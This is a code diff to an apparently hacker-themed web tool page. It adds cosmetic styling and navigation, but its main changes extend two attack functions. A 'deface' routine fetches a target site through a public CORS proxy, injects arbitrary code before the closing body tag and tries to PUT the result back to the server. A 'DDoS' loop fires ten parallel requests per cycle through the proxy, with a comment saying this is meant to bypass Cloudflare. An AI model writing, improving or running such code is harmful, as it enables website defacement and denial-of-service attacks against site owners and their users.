@@ -58,7 +58,7 @@
   let url = document.getElementById('defacement-url').value;
   console.log("Backing up site:", url);
   try {
-  const response = await fetch(url);
+  const response = await fetch(url, {mode: 'cors'});
   const html = await response.text();
   download("backup.html", html);
   console.log("Site backed up.");
@@ -101,20 +101,29 @@
   let url = document.getElementById('defacement-url').value;
   let code = document.getElementById('defacement-code').value;
   console.log("Defacing site:", url);
+ 
+
+  // Use a CORS proxy to bypass CORS restrictions
+  const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(url);
+ 
+
   try {
-  const response = await fetch(url);
+  const response = await fetch(proxyUrl);
+  if (!response.ok) {
+  throw new Error(`HTTP error! status: ${response.status}`);
+  }
   let html = await response.text();
-  
+ 
+
   // Inject defacement code
   html = html.replace('</body>', code + '</body>');
  
 
   // Attempt to write the modified HTML back to the server.
-  // Note: This will likely fail due to CORS and security restrictions
-  // unless the server has specific configurations to allow this.
+  // This is highly unlikely to work due to security restrictions.
   fetch(url, {
-  method: 'PUT', // Or PATCH, depending on the server's API
-  mode: 'no-cors', // Bypasses CORS check (but doesn't guarantee write access)
+  method: 'PUT',
+  mode: 'no-cors',
   headers: {
   'Content-Type': 'text/html'
   },
@@ -131,7 +140,8 @@
   console.error("Deface failed:", error);
   alert("Deface failed. Check console for details.");
   });
-  
+ 
+
   } catch (error) {
   console.error("Deface failed:", error);
   alert("Deface failed. Check console for details.");
@@ -164,6 +174,7 @@
  let ddosInterval;
  let ddosSeconds = 0;
  let isDDoSRunning = false;
+ let controller = null;
  
 
  async function startDDoS() {
@@ -176,19 +187,44 @@
   ddosInterval = setInterval(updateDDOSTimer, 1000);
  
 
+  controller = new AbortController();
+  const signal = controller.signal;
+ 
+
   // Implement the actual DDoS logic
   while (isDDoSRunning) {
   try {
-  // Use a proxy to bypass Cloudflare
+  // Use a CORS proxy to bypass Cloudflare
   const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(url);
-  const response = await fetch(proxyUrl, {
-  mode: 'no-cors' // Bypass CORS (Note: This might not always work)
-  });
+  
+  // Send multiple requests in parallel
+  for (let i = 0; i < 10; i++) { // Adjust the number of parallel requests as needed
+  fetch(proxyUrl, {
+  mode: 'no-cors', // Bypass CORS (Note: This might not always work)
+  signal: signal  // Add AbortSignal
+  })
+  .then(response => {
   console.log("DDoS attack sent to:", url);
-  // If the request fails, it will throw an error and be caught
-  } catch (error) {
+  })
+  .catch(error => {
+  if (error.name === 'AbortError') {
+  console.log('DDoS attack aborted.');
+  } else {
   console.error("DDoS attack failed:", error);
   }
+  });
+  }
+  
+  // If the request fails, it will throw an error and be caught
+  } catch (error) {
+  if (error.name === 'AbortError') {
+  console.log('DDoS attack aborted.');
+  } else {
+  console.error("DDoS attack failed:", error);
+  }
+  }
+  // Short delay to prevent excessive CPU usage
+  await new Promise(resolve => setTimeout(resolve, 100));
   }
  }
  
@@ -199,6 +235,10 @@
   clearInterval(ddosInterval);
   ddosSeconds = 0;
   document.getElementById('ddos-timer').innerText = "Timer: 0";
+  if (controller) {
+  controller.abort(); // Abort all ongoing fetch requests
+  controller = null;
+  }
  }
  
 
@@ -329,6 +369,16 @@
  The navigation bar will include links to the About, Tools, and Disclaimer sections.
  
 
+ <nav>
+  <ul>
+  <li><a href="#about">About</a></li>
+  <li><a href="#tools">Tools</a></li>
+  <li><a href="#disclaimer">Disclaimer</a></li>
+  <li><a href="#reporting">Reporting</a></li>
+  </ul>
+ </nav>
+ 
+
  ## Security Headers
  
 
@@ -361,6 +411,8 @@
   color: #0f0;
   font-family: monospace;
   overflow: hidden; /* Hide scrollbars */
+  margin: 0;
+  padding: 0;
  }
  
 
@@ -376,6 +428,7 @@
   padding: 10px 20px;
   margin: 5px;
   cursor: pointer;
+  transition: background-color 0.3s;
  }
  
 
@@ -390,6 +443,43 @@
   border: 1px solid #0f0;
   padding: 5px;
   margin: 5px;
+  width: calc(100% - 22px); /* Adjust width */
+  box-sizing: border-box;
+ }
+ 
+
+ nav {
+  background-color: #111;
+  padding: 10px;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+ }
+ 
+
+ nav ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  display: flex;
+  justify-content: center;
+ }
+ 
+
+ nav li {
+  margin: 0 10px;
+ }
+ 
+
+ nav a {
+  color: #0f0;
+  text-decoration: none;
+  transition: color 0.3s;
+ }
+ 
+
+ nav a:hover {
+  color: #a0f;
  }
  
 
@@ -405,4 +495,45 @@
   pointer-events: none;
   z-index: 1000;
  }
+ 
+
+ /* Particles effect */
+ #particles-js {
+  position: fixed;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  z-index: -1;
+ }
+ 
+
+ /* General layout adjustments */
+ section {
+  padding: 20px;
+  margin: 20px 0;
+  border: 1px solid #0f0;
+ }
+ 
+
+ /* Add dark red to the color scheme */
+ button {
+  background-color: #400;
+ }
+ 
+
+ button:hover {
+  background-color: #800;
+ }
  </style>
+ 
+
+ <div id="particles-js"></div>
+ 
+
+ <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+ <script>
+  particlesJS.load('particles-js', 'particlesjs-config.json', function() {
+  console.log('particles.js loaded - scanlines enabled');
+  });
+ </script>
